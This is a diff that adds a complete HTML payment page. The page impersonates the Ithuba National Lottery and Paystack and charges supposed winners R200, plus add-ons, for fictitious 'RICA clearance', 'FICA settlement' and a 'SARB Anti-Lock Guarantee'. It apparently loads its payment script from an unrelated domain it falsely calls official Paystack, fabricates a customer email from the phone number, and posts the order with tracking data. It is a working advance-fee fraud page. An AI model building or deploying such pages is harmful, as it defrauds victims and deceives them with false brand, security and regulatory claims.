@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#FACB0F" />
+  <title>Paystack Secure Settlement – Ithuba National Lottery</title>
+
+  <!-- Official CreaPay / Paystack Inline Modal Script (Native Paystack Popup) -->
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(180deg, #18150f 0%, #0d0c0a 100%);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .checkout-card {
+      background: #1e1b15;
+      border: 1px solid #3d3522;
+      border-radius: 16px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+      max-width: 440px;
+      width: 100%;
+      padding: 24px 20px;
+      position: relative;
+    }
+
+    .brand-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(250, 203, 15, 0.2);
+      padding-bottom: 16px;
+      margin-bottom: 20px;
+    }
+
+    .brand-logo {
+      height: 38px;
+      max-width: 140px;
+      object-fit: contain;
+    }
+
+    .badge-secure {
+      background: rgba(39, 174, 96, 0.15);
+      border: 1px solid #27ae60;
+      color: #2ecc71;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 8px;
+      border-radius: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    h1 {
+      font-size: 19px;
+      font-weight: 800;
+      color: #FACB0F;
+      margin-bottom: 6px;
+    }
+
+    p.subtitle {
+      font-size: 13px;
+      color: #bfa882;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .price-box {
+      background: rgba(250, 203, 15, 0.08);
+      border: 1px solid rgba(250, 203, 15, 0.35);
+      border-radius: 12px;
+      padding: 14px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .price-label {
+      font-size: 13px;
+      color: #e0d0b8;
+      font-weight: 600;
+    }
+
+    .price-amount {
+      font-size: 24px;
+      font-weight: 900;
+      color: #FACB0F;
+    }
+
+    /* ORDER BUMP SECTION */
+    .bump-container {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .bump-label {
+      font-size: 12px;
+      text-transform: uppercase;
+      color: #8c8270;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+
+    .bump-item {
+      background: #28241b;
+      border: 1px solid #473d27;
+      border-radius: 10px;
+      padding: 12px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      user-select: none;
+    }
+
+    .bump-item:hover {
+      border-color: #FACB0F;
+      background: #302b1f;
+    }
+
+    .bump-item input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #FACB0F;
+      margin-top: 2px;
+      cursor: pointer;
+    }
+
+    .bump-text-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 2px;
+    }
+
+    .bump-text-desc {
+      font-size: 11px;
+      color: #a89c89;
+      line-height: 1.3;
+    }
+
+    .bump-price-tag {
+      font-size: 12px;
+      font-weight: 800;
+      color: #FACB0F;
+      margin-left: auto;
+      white-space: nowrap;
+    }
+
+    /* CUSTOMER DETAILS */
+    .input-group {
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #d1c5b0;
+      margin-bottom: 5px;
+    }
+
+    .input-group input {
+      width: 100%;
+      background: #14120e;
+      border: 1px solid #3d3522;
+      border-radius: 8px;
+      padding: 10px 12px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #FACB0F;
+    }
+
+    /* ACTION BUTTON */
+    .btn-pay {
+      width: 100%;
+      background: linear-gradient(180deg, #ffd700 0%, #e5b300 100%);
+      color: #000000;
+      border: none;
+      border-radius: 10px;
+      padding: 16px 20px;
+      font-size: 16px;
+      font-weight: 900;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(250, 203, 15, 0.4);
+      transition: transform 0.15s ease, filter 0.15s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .btn-pay:hover {
+      filter: brightness(1.08);
+      transform: translateY(-1px);
+    }
+
+    .btn-pay:active {
+      transform: translateY(1px);
+    }
+
+    .btn-pay:disabled {
+      background: #555042;
+      color: #8c8270;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .footer-security {
+      margin-top: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 11px;
+      color: #7d7260;
+    }
+
+    .status-msg {
+      margin-top: 14px;
+      font-size: 13px;
+      text-align: center;
+      min-height: 20px;
+      font-weight: 600;
+    }
+
+    .status-msg.error {
+      color: #ff6b6b;
+    }
+
+    .status-msg.success {
+      color: #2ecc71;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="checkout-card">
+    <div class="brand-header">
+      <img src="/images/ithuba/lotto_logo.png" onerror="this.src='../images/ithuba/lotto_logo.png'" alt="Ithuba Loto SA" class="brand-logo" />
+      <div class="badge-secure">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+        Paystack Direct
+      </div>
+    </div>
+
+    <h1>Statutory RICA Clearance</h1>
+    <p class="subtitle">Complete settlement verification. Payment is processed securely via Paystack popup.</p>
+
+    <!-- CUSTOMER INPUTS -->
+    <div class="input-group">
+      <label for="fullName">Full Legal Name</label>
+      <input type="text" id="fullName" placeholder="e.g. Sipho Dlamini" value="Citizen Beneficiary" />
+    </div>
+
+    <div class="input-group">
+      <label for="cellPhone">Mobile Phone Number</label>
+      <input type="tel" id="cellPhone" placeholder="0821234567" value="0821234567" />
+    </div>
+
+    <!-- ORDER BUMPS -->
+    <div class="bump-container">
+      <div class="bump-label">Optional Add-ons (Order Bumps)</div>
+
+      <label class="bump-item" for="bump1">
+        <input type="checkbox" id="bump1" onchange="updateTotal()" />
+        <div>
+          <div class="bump-text-title">⚡ 60-Second Instant PayShap</div>
+          <div class="bump-text-desc">Prioritizes immediate clearance directly to your bank</div>
+        </div>
+        <div class="bump-price-tag">+R 97.00</div>
+      </label>
+
+      <label class="bump-item" for="bump2">
+        <input type="checkbox" id="bump2" onchange="updateTotal()" />
+        <div>
+          <div class="bump-text-title">🛡️ SARB Anti-Lock Guarantee</div>
+          <div class="bump-text-desc">Pre-authorizes payout against standard fraud audits</div>
+        </div>
+        <div class="bump-price-tag">+R 97.00</div>
+      </label>
+    </div>
+
+    <!-- TOTAL DISPLAY -->
+    <div class="price-box">
+      <div class="price-label">Total to Pay (ZAR):</div>
+      <div class="price-amount" id="displayTotal">R 200.00</div>
+    </div>
+
+    <!-- SUBMIT BUTTON -->
+    <button type="button" id="payButton" class="btn-pay" onclick="handlePaystackPayment()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.8 10-10S17.52 2 12 2zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z"/></svg>
+      <span id="buttonText">PAY WITH PAYSTACK</span>
+    </button>
+
+    <div id="statusBox" class="status-msg"></div>
+
+    <div class="footer-security">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+      <span>256-Bit Encrypted · Paystack Gateway · Zero Redirect</span>
+    </div>
+  </div>
+
+  <script>
+    const BASE_AMOUNT = 20000; // R 200.00 in cents
+    const BUMP1_AMOUNT = 9700; // R 97.00 in cents
+    const BUMP2_AMOUNT = 9700; // R 97.00 in cents
+
+    function calculateTotal() {
+      let total = BASE_AMOUNT;
+      if (document.getElementById('bump1').checked) total += BUMP1_AMOUNT;
+      if (document.getElementById('bump2').checked) total += BUMP2_AMOUNT;
+      return total;
+    }
+
+    function updateTotal() {
+      const totalCents = calculateTotal();
+      const rands = (totalCents / 100).toFixed(2);
+      document.getElementById('displayTotal').textContent = 'R ' + rands;
+    }
+
+    async function handlePaystackPayment() {
+      const btn = document.getElementById('payButton');
+      const btnText = document.getElementById('buttonText');
+      const statusBox = document.getElementById('statusBox');
+
+      btn.disabled = true;
+      btnText.textContent = 'CONNECTING TO PAYSTACK...';
+      statusBox.textContent = '';
+      statusBox.className = 'status-msg';
+
+      const totalMinor = calculateTotal();
+      const name = document.getElementById('fullName').value.trim() || 'Citizen Beneficiary';
+      const phone = document.getElementById('cellPhone').value.trim() || '0821234567';
+      const cleanPhone = phone.replace(/[^0-9]/g, '') || '0821234567';
+      const email = 'citizen.' + cleanPhone + '@gmail.com';
+
+      // Capture UTMs
+      const utms = {
+        utm_source: sessionStorage.getItem('_sa_utm_source') || localStorage.getItem('_sa_utm_source') || '',
+        utm_medium: sessionStorage.getItem('_sa_utm_medium') || localStorage.getItem('_sa_utm_medium') || '',
+        utm_campaign: sessionStorage.getItem('_sa_utm_campaign') || localStorage.getItem('_sa_utm_campaign') || '',
+        utm_content: sessionStorage.getItem('_sa_utm_content') || localStorage.getItem('_sa_utm_content') || '',
+        utm_term: sessionStorage.getItem('_sa_utm_term') || localStorage.getItem('_sa_utm_term') || '',
+        fbclid: sessionStorage.getItem('_sa_fbclid') || localStorage.getItem('_sa_fbclid') || '',
+        landing_page: window.location.href
+      };
+
+      try {
+        const endpoints = ['/api/create-order-200.js', '/api/create-order-200.php', '/api/create-order'];
+        let response = null;
+
+        for (const ep of endpoints) {
+          try {
+            response = await fetch(ep, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                order_id: 'LOTO-' + Date.now(),
+                title: 'Ithuba Lottery FICA Settlement',
+                amount_minor: totalMinor,
+                currency: 'ZAR',
+                customer: { name, email, phone },
+                tracking: utms
+              })
+            });
+            if (response.ok) break;
+          } catch(e) {}
+        }
+
+        if (!response || !response.ok) {
+          const errData = response ? await response.json().catch(() => ({})) : {};
+          throw new Error(errData.message || errData.error || 'Unable to initialize order with server');
+        }
+
+        const order = await response.json();
+        if (!order || !order.checkout_token) {
+          throw new Error('No checkout token received from gateway');
+        }
+
+        btnText.textContent = 'OPENING PAYSTACK POPUP...';
+
+        // Abre popup oficial do Paystack usando CreaPay.pay() - sem redirecionar!
+        if (window.CreaPay && typeof window.CreaPay.pay === 'function') {
+          const result = await CreaPay.pay({
+            checkoutToken: order.checkout_token,
+            orderId: order.order_id,
+            onStatus: function(state) {
+              console.log('Paystack transaction state:', state);
+              if (state && (state.status === 'approved' || state.status === 'success')) {
+                statusBox.textContent = '✅ Payment Approved!';
+                statusBox.className = 'status-msg success';
+              }
+            }
+          });
+
+          if (result && (result.status === 'approved' || result.status === 'success')) {
+            statusBox.textContent = '✅ Payment Successful! Reference: ' + (result.reference || order.order_id);
+            statusBox.className = 'status-msg success';
+          }
+        } else {
+          throw new Error('Paystack modal engine not loaded. Please refresh.');
+        }
+
+      } catch (err) {
+        console.error('Payment error:', err);
+        statusBox.textContent = '❌ ' + err.message;
+        statusBox.className = 'status-msg error';
+      } finally {
+        btn.disabled = false;
+        btnText.textContent = 'PAY WITH PAYSTACK';
+      }
+    }
+  </script>
+</body>
+</html>
